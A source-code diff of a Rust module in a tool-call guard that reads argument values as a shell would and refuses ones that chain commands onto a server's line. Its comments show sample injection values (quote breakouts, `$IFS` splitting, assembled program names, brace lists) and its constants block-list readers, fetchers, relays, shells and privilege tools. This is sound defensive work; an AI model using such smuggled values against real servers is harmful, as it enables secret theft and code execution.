@@ -5,10 +5,9 @@
 //! adds to that line: after `;`, `&`, `&&`, `||`, `|` or a line break, in a
 //! subshell or a brace group, or in a command substitution. This module reads
 //! each string of a tool call's arguments as the shell reads it there and
-//! names the program such a command runs, when it is one a parameter has no
-//! business starting on a server: a reader of files, a fetcher or relay, an
-//! interpreter, a tool that changes owners, modes, mounts or processes, a
-//! privilege tool, or one that prints the environment.
+//! judges each command it adds by what the command does: reads a file, runs
+//! code, fetches or relays, changes owners, modes, mounts or processes, takes
+//! privilege, or prints the environment.
 //!
 //! # Why the shell's words, not a pattern over the text
 //!
@@ -19,16 +18,48 @@
 //! blank), and a program written with its folder (`/bin/cat`), in quotes
 //! (`'cat'`, `c'a't`) or behind a wrapper (`nohup cat`) was missed. Here the
 //! value is the decoded string the server receives, read by the same word
-//! reader the shell hook uses, and every operator leads to one judgement.
+//! reader the shell hook uses.
 //!
 //! # Where the value sits on the server's line
 //!
 //! A server may put the value on its line bare, inside single quotes or
 //! inside double quotes, and a value can close the quote it was put in
 //! (`x' && cat f '`). Each value is read once per place, behind a fixed word
-//! that stands for the server's own program, and a command found in any of
-//! the three readings counts. The first command of a reading is the server's
+//! that stands for the server's own program and before the server's closing
+//! quote, and a command found in any of the three readings counts. The first command of a reading is the server's
 //! own; every later one, and every command of a substitution, is the value's.
+//!
+//! # Two kinds of operator
+//!
+//! `;`, `&&`, `||`, `|`, a parenthesis, a brace group and a substitution are
+//! shell syntax that prose has little use for. After one of them a command
+//! counts when it runs a program of [`PROGRAMS`] at all, a reader of
+//! [`READERS`] handed an operand, a reader whose name is also an English word
+//! ([`READER_WORDS`]: `sort of`, `more or less`) handed an operand that names
+//! a file, or a program the line computes when it runs and hands something.
+//!
+//! A line break and a lone `&` are also how notes, messages, scripts and
+//! documents break a line (`cat food` on a shopping list) or join two words
+//! (`dog & cat`). After one of them a command counts only for what it is
+//! handed: a path from the root, a home or a parent folder, a file read on
+//! its input, code to run (`-c`, `-e`, `-i`), or nothing at all when it
+//! prints the environment; and only as the shell spells it (`Python 3.12` at
+//! the start of a line is prose). A relative path is left out there, since a
+//! script or a Makefile written through a file tool says `rm -rf bin`.
+//!
+//! Whatever the operator, a file read on a command's input (`< /path`) counts
+//! whichever program reads it, the shell's own `read` included.
+//!
+//! # A program the guard cannot name
+//!
+//! The program can come from the line itself: a substitution (`$(...)`), two
+//! parameters joined, an expansion other than a plain parameter. Such a
+//! program is refused once it is handed something, since the guard cannot
+//! tell which program it is; one bare parameter (`$a && $b` in code) only for
+//! a path. A parameter the value assigns is followed (`A=ca; B=t; $A$B`). An
+//! unquoted parameter glued to a program's name (`cat$IFS/path`) may split
+//! the word in two, so the name in front of it is a program and the rest its
+//! operand.
 //!
 //! # What is not a chained command
 //!
@@ -37,41 +68,93 @@
 //! passes `{` as a word), so neither ends a command here; a command can still
 //! start after an operator or a reserved word, which is all a subshell or a
 //! brace group needs. A `NAME=value` word assigns and runs nothing, which is
-//! what a URL query string is to the shell (`?page=2&id=17`). A command
-//! counts only when the program it runs is one of [`PROGRAMS`], so prose
-//! (`R&D`, `Tom && Jerry`) and code (`a && b`) pass. Four of those programs
-//! are also common words of code and are judged by what the shell would make
-//! them do with the words they got: `export` and `set` print the environment
-//! only with no name to act on (`export default App` names one), `id` prints
-//! nothing once it has more than one operand or is handed `=` (`id = 5`), and
-//! `env`, `exec` and the other wrappers are judged by the program they start
-//! (`env = os.environ` starts a program named `=`), `env` alone printing the
-//! environment. A quote or a substitution that never closes makes the shell
-//! refuse the line, so it runs nothing (a lone `` ```bash `` line). A glob
-//! without a folder names a file in the server's working directory, not a
-//! program the value chose (`* item`). A builtin is matched only as the
-//! shell spells it (`Set` is no command), a program on the path in any case.
+//! what a URL query string is to the shell (`?page=2&id=17`). Prose (`R&D`,
+//! `Tom && Jerry`) and code (`a && b`) name no program of the lists. Four of
+//! those programs are also common words of code and are judged by what the
+//! shell would make them do with the words they got: `export`, `declare` and
+//! `set` print the environment only with no name to act on (`export default
+//! App` names one), `id` prints nothing once it has more than one operand or
+//! is handed `=` (`id = 5`), and `env`, `exec` and the other wrappers are
+//! judged by the program they start (`env = os.environ` starts a program
+//! named `=`), `env` alone printing the environment. A quote or a
+//! substitution that never closes makes the shell refuse the line, so it runs
+//! nothing (a lone `` ```bash `` line). A glob without a folder names a file
+//! in the server's working directory, not a program the value chose (`*
+//! item`). A builtin is matched only as the shell spells it (`Set` is no
+//! command), a program on the path in any case after a tight operator.
 //!
-//! Measured on 2026-11-14 over 289,583 lines of documentation and code
-//! comments (Python's library, `/usr/share/doc`, npm's modules) each sent as
-//! a one-line argument: 394 lines read as a chained command, 60 of them not
-//! already refused by another rule. Most are a shell command quoted in prose
-//! (`` `openssl ciphers -v` ``), which runs when a shell gets it; the rest a
-//! table cell or a closing parenthesis followed by a program's name.
+//! # What is left
+//!
+//! A program none of the lists names, handed a file after any operator, and
+//! a relative path handed to a reader after a line break or a lone `&`, are
+//! not refused here: the first is open-ended, the second is what a line of a
+//! script or a note looks like.
+//!
+//! Measured on 2026-11-14 on a Rocky 9 host. Of 289,937 lines of
+//! documentation (Python's library, `/usr/share/doc`, npm's modules, this
+//! repository's docs) each sent as a one-line argument, 523 read as a
+//! chained command and 59 of them are not already refused by another rule
+//! (60 for the first cut of this check, which knew a short program list and
+//! read every operator alike). Of 3,635 whole files sent as a file tool's
+//! content (Python, JavaScript, JSON, Markdown, READMEs, 303 shell scripts,
+//! Makefiles), 21 are refused by this check alone (74 for the first cut).
+//! Most of both are a shell command quoted in prose (`` `openssl x509` ``),
+//! which runs when a shell gets it.
 
 use std::collections::{HashMap, HashSet};
 
-use crate::shell_words::{read_line, Line, Mark, Word};
+use crate::shell_words::{read_line, Command, Joint, Line, Mark, Word};
 
-/// The programs a chained command is refused for. The list ATR-2026-111 uses
-/// inside `$(...)`, the widest the rule has, plus the shells and the relay it
-/// left out.
+/// Programs a chained command is refused for after a tight operator whatever
+/// it hands them: the list ATR-2026-111 uses inside `$(...)`, the widest the
+/// rule has, plus the shells and the relay it left out. Readers of files are
+/// in [`READERS`] and [`READER_WORDS`].
 const PROGRAMS: &[&str] = &[
-    "rm", "cat", "curl", "wget", "nc", "ncat", "bash", "sh", "python", "perl", "ruby", "php",
-    "whoami", "id", "uname", "env", "printenv", "set", "export", "eval", "exec", "chmod", "chown",
-    "kill", "pkill", "dd", "mkfs", "mount", "umount", "sudo", "su", "passwd", "base64", "xxd",
-    "openssl", "tee", "zsh", "ksh", "dash", "socat",
+    "rm", "curl", "wget", "nc", "ncat", "bash", "sh", "python", "perl", "ruby", "php", "whoami",
+    "id", "uname", "env", "printenv", "set", "export", "declare", "typeset", "eval", "exec",
+    "chmod", "chown", "kill", "pkill", "dd", "mkfs", "mount", "umount", "sudo", "su", "passwd",
+    "openssl", "zsh", "ksh", "dash", "socat",
 ];
+
+/// Programs that print, copy or run a file they are named: refused after a
+/// tight operator once they get an operand. Given none, they read their input,
+/// which on a server's line is the output of the server's own program.
+const READERS: &[&str] = &[
+    "cat", "tac", "nl", "od", "xxd", "hexdump", "hd", "strings", "base64", "base32", "basenc",
+    "uuencode", "sed", "awk", "gawk", "mawk", "nawk", "grep", "egrep", "fgrep", "zgrep", "rg",
+    "ag", "ack", "zcat", "bzcat", "xzcat", "zstdcat", "lzcat", "jq", "yq", "xmllint", "iconv",
+    "uniq", "rev", "tee", "vi", "vim", "nvim", "nano", "emacs", "sqlite3", "node", "nodejs",
+    "deno", "bun", "lua", "luajit", "tclsh", "pwsh",
+];
+
+/// Readers whose first operand is a pattern or a program, not a file
+/// (`| grep word` reads its input): they read a file from their second.
+const PATTERN_FIRST: &[&str] = &[
+    "sed", "awk", "gawk", "mawk", "nawk", "grep", "egrep", "fgrep", "zgrep", "rg", "ag", "ack",
+    "jq", "yq",
+];
+
+/// Readers whose names are also words of English prose (`sort of`, `more or
+/// less`), and `.`, which ends a sentence after a parenthesis (`(if any).
+/// To get`): refused after a tight operator only for an operand that names
+/// a file (a folder, a home, an extension) or a computed one.
+const READER_WORDS: &[&str] = &[
+    ".", "head", "tail", "more", "less", "most", "sort", "cut", "paste", "join", "split", "csplit",
+    "fold", "fmt", "pr", "expand", "unexpand", "column", "comm", "diff", "cmp", "look", "cp", "mv",
+    "install", "source", "shuf",
+];
+
+/// Interpreters and shells: after a loose operator they count when told to
+/// run code given on the line (`-c`, `-e`) or to stay interactive (`-i`).
+const INTERPRETERS: &[&str] = &[
+    "bash", "sh", "zsh", "ksh", "dash", "python", "perl", "ruby", "php", "node", "nodejs", "lua",
+    "tclsh", "pwsh",
+];
+
+/// Programs that print the environment or the server's user with nothing to
+/// act on, counted after a loose operator too (`env`, `set`, `export`,
+/// `declare`, `typeset` and `id` are judged by their own operands).
+const DISCLOSERS: &[&str] = &["printenv", "whoami"];
 
 /// Programs that run another program named among their operands: judged by
 /// that program.
@@ -95,9 +178,14 @@ const DEPTH: u8 = 8;
 pub(crate) enum Chained {
     /// It runs this program.
     Runs(&'static str),
-    /// A substitution that only redirects a file into itself (`$(<file)`):
-    /// bash reads the file into the line without running a program.
+    /// It reads a file on its input (`< /path`), or it is a substitution
+    /// that only redirects a file into itself (`$(<file)`): bash reads the
+    /// file into the line without running a program.
     ReadsFile,
+    /// Its program is computed when the line runs (a substitution, or
+    /// parameters the value does not assign), and it is handed what the
+    /// value names: the guard cannot tell which program that is.
+    Computed,
     /// Its substitutions or wrappers nest deeper than [`DEPTH`].
     TooDeep,
 }
@@ -116,8 +204,11 @@ impl Chained {
             Chained::Runs(program) => format!(
                 "argument `{argument}` adds a command to a shell line that runs `{program}`"
             ),
-            Chained::ReadsFile => format!(
-                "argument `{argument}` holds a substitution that reads a file into a shell line"
+            Chained::ReadsFile => {
+                format!("argument `{argument}` adds a command to a shell line that reads a file")
+            }
+            Chained::Computed => format!(
+                "argument `{argument}` adds a command to a shell line whose program is computed when it runs"
             ),
             Chained::TooDeep => format!(
                 "argument `{argument}` nests commands deeper than the guard reads ({DEPTH} levels)"
@@ -162,13 +253,14 @@ pub(crate) fn chained_command(value: &str) -> Option<Chained> {
     }
     let text = prepare(value);
     ["", "'", "\""].into_iter().find_map(|open| {
-        let reading = format!("x{open}{text}");
+        // The server's own quote closes after the value.
+        let reading = format!("x{open}{text}{open}");
         let line = read_line(&reading);
         let assigned = assignments(&line);
         line.commands
             .iter()
             .skip(1)
-            .find_map(|command| runs(&command.words, &assigned, 0))
+            .find_map(|command| judge(command, tier_of(command), &assigned, 0))
             .or_else(|| nested(&line, &reading, 0))
     })
 }
@@ -216,7 +308,7 @@ fn nested(line: &Line, text: &str, depth: u8) -> Option<Chained> {
         let found = read
             .commands
             .iter()
-            .find_map(|command| runs(&command.words, &assigned, depth + 1))
+            .find_map(|command| judge(command, Tier::Tight, &assigned, depth + 1))
             .or(file_read.then_some(Chained::ReadsFile));
         // The reader hands back the inside of `${...}` with the command
         // lines: a bare name no command substitution of `text` holds is a
@@ -292,10 +384,75 @@ fn never_closed(inner: &str, text: &str) -> bool {
         .any(|open| text.ends_with(&format!("{open}{inner}")))
 }
 
-/// The program `words`, a simple command, runs, when it is one of
-/// [`PROGRAMS`] and runs as one: past the assignments and the reserved words
-/// in front of it, and through the wrappers.
-fn runs(words: &[Word], assigned: &HashMap<String, String>, depth: u8) -> Option<Chained> {
+/// How much a command's position says about it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Tier {
+    /// After `;`, `&&`, `||`, `|` or a brace or parenthesis, or inside a
+    /// substitution: shell syntax, which prose has little use for.
+    Tight,
+    /// After a line break or a lone `&`: how notes, messages, scripts and
+    /// documents break a line (`cat food` on a shopping list) or join two
+    /// words (`dog & cat`). A command there counts only for what it is
+    /// handed: a path from the root, a home or a parent folder, a file read
+    /// on its input, code to run, or nothing at all when it prints the
+    /// environment.
+    Loose,
+}
+
+fn tier_of(command: &Command) -> Tier {
+    match command.after {
+        Joint::Loose => Tier::Loose,
+        Joint::Start | Joint::Tight => Tier::Tight,
+    }
+}
+
+/// What `command`, a simple command at `tier`, does that a value has no
+/// business adding to a server's line: a file it reads on its input, else
+/// what its program does with its words.
+fn judge(
+    command: &Command,
+    tier: Tier,
+    assigned: &HashMap<String, String>,
+    depth: u8,
+) -> Option<Chained> {
+    // A file read on the input is a file read whatever the program, the
+    // shell's own `read` included (`read l < /path`), and wherever the
+    // redirection is written (`done < /path` after a loop).
+    if command
+        .reads
+        .iter()
+        .any(|target| names_a_place(&target.text) && !closes_a_tag(&target.text))
+    {
+        return Some(Chained::ReadsFile);
+    }
+    runs(&command.words, tier, assigned, depth)
+}
+
+/// `target`, read after a `<`, is the rest of an HTML closing tag (`</td>`
+/// in a table cell, `</span>`): a file of that name at the root of the
+/// server's disk is no file a value would read.
+fn closes_a_tag(target: &str) -> bool {
+    const TAGS: &str =
+        "a abbr b big blockquote body br button center cite code dd del details dfn \
+         div dl dt em figcaption figure font footer form h1 h2 h3 h4 h5 h6 head \
+         header html i ins kbd label li main mark nav ol option p pre q s samp script \
+         section select small span strong style sub summary sup table tbody td tfoot \
+         th thead title tr tt u ul var";
+    target.strip_prefix('/').is_some_and(|tag| {
+        TAGS.split_whitespace()
+            .any(|known| known.eq_ignore_ascii_case(tag))
+    })
+}
+
+/// What `words`, a simple command at `tier`, runs that counts: past the
+/// assignments and the reserved words in front of it, and through the
+/// wrappers.
+fn runs(
+    words: &[Word],
+    tier: Tier,
+    assigned: &HashMap<String, String>,
+    depth: u8,
+) -> Option<Chained> {
     if depth > DEPTH {
         return Some(Chained::TooDeep);
     }
@@ -310,22 +467,75 @@ fn runs(words: &[Word], assigned: &HashMap<String, String>, depth: u8) -> Option
             break;
         }
     }
-    let words = words.get(at..)?;
-    let program = program_name(words.first()?, assigned)?;
-    let operands = &words[1..];
-    match program {
-        "export" => operands
-            .iter()
-            .all(|word| word.text.starts_with('-'))
-            .then_some(Chained::Runs("export")),
-        "set" => operands.is_empty().then_some(Chained::Runs("set")),
+    let (first, operands) = words.get(at..)?.split_first()?;
+    match head_of(first, assigned) {
+        Head::Other => None,
+        Head::Computed { bare, glued } => {
+            // A program the line computes is refused when it is handed
+            // something: after a tight operator any operand, or text glued
+            // to it, unless it is one bare parameter (`$a && $b` in code);
+            // a bare one, or any after a loose operator, for a path.
+            let named = glued.as_deref().is_some_and(names_a_place)
+                || operands.iter().any(|word| names_a_place(&word.text));
+            let handed = glued.is_some() || !operands.is_empty();
+            let counts = match tier {
+                Tier::Tight if !bare => handed,
+                _ => named,
+            };
+            counts.then_some(Chained::Computed)
+        }
+        Head::Known { name, exact, glued } => program(
+            name,
+            exact,
+            glued.as_deref(),
+            operands,
+            tier,
+            assigned,
+            depth,
+        ),
+    }
+}
+
+/// What `name`, written as the shell spells it when `exact`, does with
+/// `operands` and the text `glued` to it past a field split.
+fn program(
+    name: &'static str,
+    exact: bool,
+    glued: Option<&str>,
+    operands: &[Word],
+    tier: Tier,
+    assigned: &HashMap<String, String>,
+    depth: u8,
+) -> Option<Chained> {
+    // A server on a case-insensitive file system finds `CAT`, but prose
+    // starts a line with a capital (`Cat food`, `Python 3.12`): after a
+    // loose operator only the spelling the shell uses counts.
+    if tier == Tier::Loose && !exact {
+        return None;
+    }
+    let options_only = glued.is_none() && operands.iter().all(|word| word.text.starts_with('-'));
+    match name {
+        // `declare -f` prints functions, not the environment.
+        "declare" | "typeset"
+            if operands
+                .iter()
+                .any(|word| matches!(word.text.as_str(), "-f" | "-F")) =>
+        {
+            None
+        }
+        "export" | "declare" | "typeset" => options_only.then_some(Chained::Runs(name)),
+        "set" => (glued.is_none() && operands.is_empty()).then_some(Chained::Runs("set")),
         "id" => {
             let named: Vec<&Word> = operands
                 .iter()
                 .filter(|word| !word.text.starts_with('-'))
                 .collect();
-            let fails =
-                named.len() > 1 || named.first().is_some_and(|word| is_operator(&word.text));
+            // `id root` after a tight operator; after a loose one a record
+            // (`id 4471`) is no command.
+            let most = if tier == Tier::Tight { 1 } else { 0 };
+            let fails = glued.is_some()
+                || named.len() > most
+                || named.first().is_some_and(|word| is_operator(&word.text));
             (!fails).then_some(Chained::Runs("id"))
         }
         "eval" => {
@@ -337,21 +547,93 @@ fn runs(words: &[Word], assigned: &HashMap<String, String>, depth: u8) -> Option
             let inner = assignments(&read);
             read.commands
                 .iter()
-                .find_map(|command| runs(&command.words, &inner, depth + 1))
+                .find_map(|command| judge(command, Tier::Tight, &inner, depth + 1))
                 .or_else(|| nested(&read, &joined.join(" "), depth + 1))
         }
-        "env" => match wrapped(operands, assigned, depth) {
+        "env" => match wrapped(operands, tier, assigned, depth) {
             Some(found) => found,
             // Nothing to run: `env` prints the environment.
             None => Some(Chained::Runs("env")),
         },
-        wrapper if WRAPPERS.contains(&wrapper) => wrapped(operands, assigned, depth).flatten(),
-        program => Some(Chained::Runs(program)),
+        "sudo" | "su" if tier == Tier::Tight => Some(Chained::Runs(name)),
+        wrapper if WRAPPERS.contains(&wrapper) => {
+            wrapped(operands, tier, assigned, depth).flatten()
+        }
+        _ => {
+            let named_operands = operands
+                .iter()
+                .filter(|word| !word.text.starts_with('-'))
+                .count()
+                + usize::from(glued.is_some());
+            let handed = named_operands > usize::from(PATTERN_FIRST.contains(&name));
+            let names_file = glued.is_some_and(names_a_file)
+                || operands
+                    .iter()
+                    .any(|word| word.text.starts_with('$') || names_a_file(&word.text));
+            let named = glued.is_some_and(names_a_place)
+                || operands.iter().any(|word| names_a_place(&word.text));
+            let counts = match tier {
+                Tier::Tight if READERS.contains(&name) => handed,
+                Tier::Tight if READER_WORDS.contains(&name) => names_file,
+                Tier::Tight => PROGRAMS.contains(&name),
+                Tier::Loose => {
+                    named
+                        || (DISCLOSERS.contains(&name) && options_only)
+                        || (INTERPRETERS.contains(&name) && runs_given_code(operands))
+                }
+            };
+            counts.then_some(Chained::Runs(name))
+        }
     }
 }
 
+/// An interpreter's `operands` tell it to run code given on the line or to
+/// stay interactive: `-c`, `-e`, `-i` alone or in a cluster of letters.
+fn runs_given_code(operands: &[Word]) -> bool {
+    operands.iter().any(|word| {
+        let text = word.text.as_str();
+        match text.strip_prefix("--") {
+            Some(long) => matches!(long, "command" | "eval" | "interactive"),
+            None => text.strip_prefix('-').is_some_and(|short| {
+                short.contains(['c', 'e', 'i', 'r'])
+                    && short.chars().all(|c| c.is_ascii_alphabetic())
+            }),
+        }
+    })
+}
+
+/// `text` names a place on the server from somewhere the value chose: the
+/// root, a home, a parent folder, or a parameter's folder (`$HOME/x`), alone
+/// or as an option's value (`--data=@/path`, `-o/path`). A path relative to
+/// the server's folder is left out: scripts and Makefiles write `rm -rf bin`.
+fn names_a_place(text: &str) -> bool {
+    let from_here = |text: &str| {
+        text.starts_with('/')
+            || text.starts_with('~')
+            || text.starts_with("../")
+            || (text.starts_with('$') && text.contains('/'))
+    };
+    from_here(text)
+        || text
+            .match_indices(['=', '@'])
+            .any(|(at, _)| from_here(&text[at + 1..]))
+}
+
+/// `text` names a file a program would open: a place ([`names_a_place`]), a
+/// path through a folder, or a name with an extension (`notes.txt`).
+fn names_a_file(text: &str) -> bool {
+    if names_a_place(text) || text.contains('/') {
+        return true;
+    }
+    text.rsplit_once('.').is_some_and(|(stem, extension)| {
+        !stem.is_empty()
+            && (1..=5).contains(&extension.len())
+            && extension.chars().all(|c| c.is_ascii_alphanumeric())
+    })
+}
+
 /// What a wrapper given `operands` runs: `None` when it is given no program,
-/// `Some(None)` when the program it runs is not one of [`PROGRAMS`].
+/// `Some(None)` when the program it runs does not count.
 ///
 /// Options are passed over. A word right after an option may be that option's
 /// value (`timeout -s KILL`, `env -u NAME`), so it is judged as a program and,
@@ -359,6 +641,7 @@ fn runs(words: &[Word], assigned: &HashMap<String, String>, depth: u8) -> Option
 /// `timeout 5s`) and assignments (`env A=1`) are passed over.
 fn wrapped(
     operands: &[Word],
+    tier: Tier,
     assigned: &HashMap<String, String>,
     depth: u8,
 ) -> Option<Option<Chained>> {
@@ -366,7 +649,7 @@ fn wrapped(
     for (index, word) in operands.iter().enumerate() {
         let text = word.text.as_str();
         if text == "--" {
-            return Some(runs(&operands[index + 1..], assigned, depth + 1));
+            return Some(runs(&operands[index + 1..], tier, assigned, depth + 1));
         }
         if text.len() > 1 && text.starts_with('-') {
             after_option = true;
@@ -375,7 +658,7 @@ fn wrapped(
         if is_assignment(word) || is_duration(text) {
             continue;
         }
-        let found = runs(&operands[index..], assigned, depth + 1);
+        let found = runs(&operands[index..], tier, assigned, depth + 1);
         if !after_option || found.is_some() {
             return Some(found);
         }
@@ -384,16 +667,235 @@ fn wrapped(
     None
 }
 
-/// The [`PROGRAMS`] or [`WRAPPERS`] entry `word` names as a command word:
-/// its last path component, quotes and escapes taken out, a version suffix
-/// dropped (`python3.11`), letters of either case. A glob is matched as the
-/// shell would match it (`/bin/c?t`), a brace by its first alternative, a
-/// parameter by what the line assigned it (`A=/bin/cat; $A`), and text an
-/// expansion adds is left out (`c${u}at`).
-fn program_name(word: &Word, assigned: &HashMap<String, String>) -> Option<&'static str> {
-    if let Some(value) = parameter_of(word).and_then(|name| assigned.get(name)) {
-        return known(value.rsplit('/').next().unwrap_or(value));
+/// What a command word names.
+#[derive(Debug, PartialEq, Eq)]
+enum Head {
+    /// An entry of the lists, `exact` when written as the shell spells it,
+    /// with the text a field split leaves glued after it (`cat$IFS/path`).
+    Known {
+        name: &'static str,
+        exact: bool,
+        glued: Option<String>,
+    },
+    /// A program the line computes when it runs: a substitution, an
+    /// expansion other than a plain parameter, or parameters the value does
+    /// not assign with no name of their own around them. `bare` when it is
+    /// one parameter and nothing else.
+    Computed { bare: bool, glued: Option<String> },
+    /// Anything else: a word of prose or code.
+    Other,
+}
+
+/// One piece of a command word.
+enum Piece {
+    /// Text handed on as written (glob and brace characters included).
+    Text(String),
+    /// `$name` or `${name}`.
+    Parameter(String),
+    /// Any other expansion: a substitution, `${name:0:1}`, `$1`, `$@`.
+    Expansion,
+}
+
+/// The pieces of `word`, `None` when a quote in it never closes: the shell
+/// refuses that line before running any of it.
+fn pieces(word: &Word) -> Option<Vec<Piece>> {
+    let chars: Vec<char> = word.text.chars().collect();
+    let mut out = Vec::new();
+    let mut at = 0;
+    while at < chars.len() {
+        let expansion = word.marks[at] == Mark::Expansion;
+        let end = (at..chars.len())
+            .find(|index| (word.marks[*index] == Mark::Expansion) != expansion)
+            .unwrap_or(chars.len());
+        let run: String = chars[at..end].iter().collect();
+        if !expansion {
+            out.push(Piece::Text(run));
+        } else {
+            if !run.starts_with(['$', '`']) {
+                return None;
+            }
+            let mut rest = run.as_str();
+            while !rest.is_empty() {
+                let (piece, used) = parameter_at(rest);
+                // A substitution whose line is one plain word (`` `key` ``
+                // in a code span, `$(pwd)`) prints what that program prints,
+                // which the value cannot steer to a program's name: an
+                // unknown, like a parameter the value does not assign.
+                let piece = match piece {
+                    Piece::Expansion
+                        if rest.starts_with(['`', '$'])
+                            && !rest.starts_with("${")
+                            && !word.substitutions.is_empty()
+                            && word.substitutions.iter().all(|inner| one_plain_word(inner)) =>
+                    {
+                        Piece::Parameter(String::new())
+                    }
+                    other => other,
+                };
+                out.push(piece);
+                rest = &rest[used..];
+            }
+        }
+        at = end;
     }
+    Some(out)
+}
+
+/// `line` is one word the shell takes as written and nothing else.
+fn one_plain_word(line: &str) -> bool {
+    let read = read_line(line);
+    read.nested.is_empty()
+        && read.commands.len() == 1
+        && read.commands[0].words.len() == 1
+        && read.commands[0].reads.is_empty()
+        && read.commands[0].words[0].is_plain()
+}
+
+/// The piece at the start of `run`, a run of expansion text, and its length.
+fn parameter_at(run: &str) -> (Piece, usize) {
+    if let Some(after) = run.strip_prefix("${") {
+        if let Some(close) = after.find('}') {
+            let inner = &after[..close];
+            if is_name(inner) {
+                return (Piece::Parameter(inner.to_string()), close + 3);
+            }
+        }
+    } else if let Some(after) = run.strip_prefix('$') {
+        let length = after
+            .chars()
+            .take_while(|c| *c == '_' || c.is_ascii_alphanumeric())
+            .count();
+        if length > 0 && is_name(&after[..length]) {
+            return (Piece::Parameter(after[..length].to_string()), length + 1);
+        }
+        // A positional or special parameter (`$1`, `$@`, `$$`): a value of
+        // the server's own shell, never assigned by the value, like a name
+        // it does not assign.
+        if let Some(c) = after
+            .chars()
+            .next()
+            .filter(|c| c.is_ascii_digit() || "@*#?$!-".contains(*c))
+        {
+            return (Piece::Parameter(c.to_string()), 2);
+        }
+    }
+    // Anything else runs to the end of the expansion: the program it gives
+    // is not one the guard can read.
+    (Piece::Expansion, run.len())
+}
+
+/// The last folder component of `text`.
+fn last_component(text: &str) -> &str {
+    text.rsplit('/').next().unwrap_or(text)
+}
+
+/// What `word`, a command word, names. A word with no expansion is matched
+/// as written: a glob as the shell would match it (`/bin/c?t`), a brace by
+/// its first alternative. A parameter the line assigns is replaced by its
+/// value (`A=ca; B=t; $A$B`). Past a parameter the value does not assign,
+/// the shell may split the word in two (`$IFS`), so the text in front of it
+/// is a program of its own; the text the line shows with the parameter left
+/// out is one too (`c${u}at`). What none of those names, the line computes.
+fn head_of(word: &Word, assigned: &HashMap<String, String>) -> Head {
+    let known_here = |text: &str, glued: Option<String>| {
+        let name = last_component(text);
+        known(name).map(|entry| Head::Known {
+            name: entry,
+            exact: !name.chars().any(|c| c.is_ascii_uppercase()),
+            glued,
+        })
+    };
+    if !word.has(Mark::Expansion) {
+        return match plain_name(word) {
+            Some((name, exact)) => Head::Known {
+                name,
+                exact,
+                glued: brace_rest(word),
+            },
+            None => Head::Other,
+        };
+    }
+    let Some(pieces) = pieces(word) else {
+        return Head::Other;
+    };
+    let mut resolved = String::new();
+    let mut shown = String::new();
+    let mut first_open: Option<usize> = None;
+    let mut computed = false;
+    let mut parameters = 0;
+    for (index, piece) in pieces.iter().enumerate() {
+        match piece {
+            Piece::Text(text) => {
+                if first_open.is_none() {
+                    resolved.push_str(text);
+                }
+                shown.push_str(text);
+            }
+            Piece::Parameter(name) => match assigned.get(name) {
+                Some(value) if first_open.is_none() => {
+                    resolved.push_str(value);
+                    shown.push_str(value);
+                }
+                Some(value) => shown.push_str(value),
+                None => {
+                    parameters += 1;
+                    first_open.get_or_insert(index);
+                }
+            },
+            Piece::Expansion => {
+                computed = true;
+                first_open.get_or_insert(index);
+            }
+        }
+    }
+    let Some(open) = first_open else {
+        return known_here(&resolved, None).unwrap_or(Head::Other);
+    };
+    let after: String = pieces[open + 1..]
+        .iter()
+        .map(|piece| match piece {
+            Piece::Text(text) => text.as_str(),
+            Piece::Parameter(_) | Piece::Expansion => "$",
+        })
+        .collect();
+    let glued = (!after.is_empty()).then_some(after);
+    if !resolved.is_empty() {
+        if let Some(found) = known_here(&resolved, glued.clone()) {
+            return found;
+        }
+    }
+    if !computed {
+        if let Some(found) = known_here(&shown, None) {
+            return found;
+        }
+    }
+    let has_text = pieces
+        .iter()
+        .any(|piece| matches!(piece, Piece::Text(text) if !text.is_empty()));
+    // Text a program's name cannot hold around the expansion (`[`, `,`, a
+    // quote mark left as written) names no program: a code span in a table
+    // cell or a sentence.
+    let nameable = pieces.iter().all(|piece| match piece {
+        Piece::Text(text) => text
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "_./+-~".contains(c)),
+        Piece::Parameter(_) | Piece::Expansion => true,
+    });
+    if nameable && (computed || (!has_text && parameters > 0)) {
+        Head::Computed {
+            bare: !computed && parameters == 1 && pieces.len() == 1,
+            glued,
+        }
+    } else {
+        Head::Other
+    }
+}
+
+/// The entry a word with no expansion names, and whether it is written as
+/// the shell spells it: its last path component, quotes and escapes taken
+/// out, a glob matched as the shell would match it (`/bin/c?t`), a brace by
+/// its first alternative.
+fn plain_name(word: &Word) -> Option<(&'static str, bool)> {
     let (chars, marks) = first_alternative(word);
     let start = chars
         .iter()
@@ -411,11 +913,9 @@ fn program_name(word: &Word, assigned: &HashMap<String, String>) -> Option<&'sta
         if start == 0 || literal < 2 {
             return None;
         }
-        return PROGRAMS
-            .iter()
-            .chain(WRAPPERS)
-            .copied()
-            .find(|name| glob_matches(chars, marks, &name.chars().collect::<Vec<_>>()));
+        return every_entry()
+            .find(|name| glob_matches(chars, marks, &name.chars().collect::<Vec<_>>()))
+            .map(|name| (name, true));
     }
     let plain: String = chars
         .iter()
@@ -423,7 +923,36 @@ fn program_name(word: &Word, assigned: &HashMap<String, String>) -> Option<&'sta
         .filter(|(_, mark)| **mark == Mark::Plain)
         .map(|(c, _)| *c)
         .collect();
-    known(&plain)
+    known(&plain).map(|name| (name, !plain.chars().any(|c| c.is_ascii_uppercase())))
+}
+
+/// The words a brace list adds after its first alternative, which the
+/// program gets as operands (`{cat,/path}`), as one text.
+fn brace_rest(word: &Word) -> Option<String> {
+    let comma = word
+        .text
+        .chars()
+        .zip(&word.marks)
+        .position(|(c, mark)| c == ',' && *mark == Mark::Pattern)?;
+    Some(
+        word.text
+            .chars()
+            .zip(&word.marks)
+            .skip(comma + 1)
+            .filter(|(c, mark)| !(**mark == Mark::Pattern && matches!(c, '{' | '}' | ',')))
+            .map(|(c, _)| c)
+            .collect(),
+    )
+}
+
+/// Every program the lists name.
+fn every_entry() -> impl Iterator<Item = &'static str> {
+    PROGRAMS
+        .iter()
+        .chain(READERS)
+        .chain(READER_WORDS)
+        .chain(WRAPPERS)
+        .copied()
 }
 
 /// The entry `name` is, with a version suffix set aside. A program found on
@@ -431,17 +960,16 @@ fn program_name(word: &Word, assigned: &HashMap<String, String>) -> Option<&'sta
 /// file system finds `CAT`; a builtin only as the shell spells it, since no
 /// shell looks a builtin up in another case (`Set` in prose is no command).
 fn known(name: &str) -> Option<&'static str> {
-    const BUILTINS: &[&str] = &["set", "export", "eval", "exec", "coproc"];
+    const BUILTINS: &[&str] = &[
